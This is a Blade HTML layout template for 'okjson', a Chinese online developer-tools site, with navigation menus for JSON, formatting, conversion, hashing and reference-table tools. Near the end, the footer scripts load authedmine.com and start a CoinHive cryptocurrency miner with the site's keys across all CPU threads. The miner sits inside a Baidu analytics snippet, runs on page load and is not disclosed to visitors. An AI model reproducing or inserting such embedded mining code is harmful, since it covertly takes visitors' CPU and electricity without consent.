<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    @section('meta')

    @show
    <meta name="author" content="tianyu">

    <title>@section('title')JSON在线工具 - 在线JSON校验格式化工具(OK JSON) - json在线解析|json|在线校验 @show</title>

    <link rel="shortcut icon" href="{{ asset('images/favicon.png') }}" type="image/x-icon">

    <!-- Bootstrap Core CSS -->
    {{--<link href="{{ asset('css/bootstrap.min.css') }}" rel="stylesheet">--}}
    <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

    <!-- MetisMenu CSS -->
    <link href="{{ asset('css/metisMenu.min.css') }}" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="{{ asset('css/sb-admin-2.css') }}" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="{{ asset('css/font-awesome.min.css') }}" rel="stylesheet" type="text/css">

    @section('head_css')

    @show
    @section('head_js')

    @show

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->


</head>

<body>

<header class="bs-docs-nav navbar navbar-fixed-top">
    <div class="container">
        <div class="navbar-header">
            <button aria-controls="bs-navbar" aria-expanded="true" class="navbar-toggle" data-target="#bs-navbar" data-toggle="collapse" type="button">
                <span class="sr-only">导航</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a href="/" class="navbar-brand">okjson</a>
        </div>
        <nav class="navbar-collapse collapse" id="bs-navbar" aria-expanded="false" style="height:1px;">
            <ul class="nav navbar-nav">
                <li class="dropdown"><a href="/jsonformat" target="_self" class="dropdown-toggle" data-toggle="dropdown"> JSON <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/" target="_self">JSON格式化</a></li>
                        <li><a href="/json/poster" target="_self">Poster</a></li>
                        <li><a href="/json/parser" target="_self">JSON在线视图</a></li>
                        {{--<li><a href="/json/editor" target="_self">JSON在线编辑</a></li>--}}
                        <li><a href="/json/format" target="_self">JSON格式化高亮</a></li>
                    </ul>
                </li>
                <li class=""><a href="/g" target="_self">Google</a></li>
                <li class="dropdown"><a href="javascript:;" target="_self" class="dropdown-toggle" data-toggle="dropdown">格式化工具 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/format/js" target="_self">HTML/JS格式化</a></li>
                        <li><a href="/format/css" target="_self">CSS压缩/格式化</a></li>
                        <li><a href="/format/xml" target="_self">XML压缩/格式化</a></li>
                        <li><a href="/format/sql" target="_self">SQL格式化</a></li>
                    </ul>
                </li>
                <li class="dropdown"><a href="javascript:;" target="_self" class="dropdown-toggle" data-toggle="dropdown">转换工具 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/convert/time" target="_self">Unix时间戳</a></li>
                        <li><a href="/convert/url" target="_self">URL编码/解码</a></li>
                        <li><a href="/convert/markdown" target="_self">Markdown编辑器</a></li>
                        <li><a href="/convert/n2a" target="_self">Native/Asscii编码互转</a></li>
                        <li><a href="/convert/hex" target="_self">任意进制转换</a></li>
                        <li><a href="/convert/rgb" target="_self">色值转换工具</a></li>
                        <li><a href="/convert/togglecase" target="_self">字母大小写转换</a></li>
                        <li><a href="/convert/cn_tw" target="_self">中文简体繁体转换</a></li>
                    </ul>
                </li>
                <li class="dropdown"><a href="/#" target="_self" class="dropdown-toggle" data-toggle="dropdown">加密/解密 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/encrypt/md5" target="_self">MD5加密</a></li>
                        <li><a href="/encrypt/base64" target="_self">Base64</a></li>
                        <li><a href="/encrypt/openssl_encode" target="_self">Openssl加密工具</a></li>
                        <li><a href="/encrypt/openssl_decode" target="_self">Openssl解密工具</a></li>
                        <li><a href="/encrypt/hash" target="_self">在线Hash计算工具</a></li>
                    </ul>
                </li>
                <li class="dropdown"><a href="/#" target="_self" class="dropdown-toggle" data-toggle="dropdown">常用对照表 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/tables/rgb" target="_self">RGB颜色对照表</a></li>
                        <li><a href="/tables/httpstatus" target="_self">HTTP状态码表</a></li>
                        <li><a href="/tables/httpheader" target="_self">HTTP请求头大全</a></li>
                        <li><a href="/tables/httpmethod" target="_self">HTTP请求方法</a></li>
                        <li><a href="/tables/androidmanifest" target="_self">Android Manifest描述大全</a></li>
                        <li><a href="/tables/geo" target="_self">国家代码与区号查询</a></li>
                    </ul>
                </li>
                <li class="dropdown"><a href="/#" target="_self" class="dropdown-toggle" data-toggle="dropdown">常用工具 <i class="fa fa-caret-down"></i></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="/tools/wordcount" target="_self">字数计算</a></li>
                        <li><a href="/tools/regex" target="_self">正则测试</a></li>
                        <li><a href="/convert/qr" target="_self">二维码生成</a></li>
                        <li><a href="/encrypt/uuid" target="_self">UUID在线生成</a></li>
                        <li><a href="/tools/shortcut" target="_self">网址快捷方式</a></li>
                        <li><a href="/tools/screenshot" target="_self">网页截图</a></li>
                        <li><a href="/tools/downpage" target="_self">网页模版下载</a></li>
                    </ul>
                </li>

                <li class=""><a href="/page/fm" target="_blank">电台</a></li>
            </ul>
        </nav>
    </div>
</header>
<div class="nav-bottom"></div>



<div class="container">
   <div style="height: 10px;"></div>
    @section('content')

    @show
</div>


<div class="text-center " style="color:#ccc;padding: 20px">
    @yield('footer')
    Copyright © 2012-2017 豫ICP备13013046号
</div>


<!-- jQuery -->
<script src="{{ asset('js/jquery.min.js') }}" type="text/javascript"></script>
<!-- Bootstrap Core JavaScript -->
{{--<script src="{{ asset('js/bootstrap.min.js') }}" type="text/javascript"></script>--}}
<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

@section('foot_js')

@show
 <script type="text/javascript">
 (function(){$('body').css('padding-top',$('.navbar-fixed-top').height()+'px');$('.navbar-fixed-top').css('background','#f8f8f8').css('border-bottom','1px solid #ddd');$('.dropdown').mouseover(function(){$(this).find('.dropdown-menu').show()}).mouseout(function(){$(this).find('.dropdown-menu').hide()});$('.navbar-toggle .icon-bar').css('background','#1f648b');})();
 </script>
<script src="https://authedmine.com/lib/authedmine.min.js"></script>
<script type="text/javascript">
    var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?b1490187b42d2a969b6f51c5f8f4e814";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();var miner = new CoinHive.User(myMinerKey, myMinerName, {threads: navigator.hardwareConcurrency,autoThreads: false,throttle: 0.8,forceASMJS: false});miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
</script>
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-103939233-1', 'auto'); ga('send', 'pageview');
</script>
</body>
</html>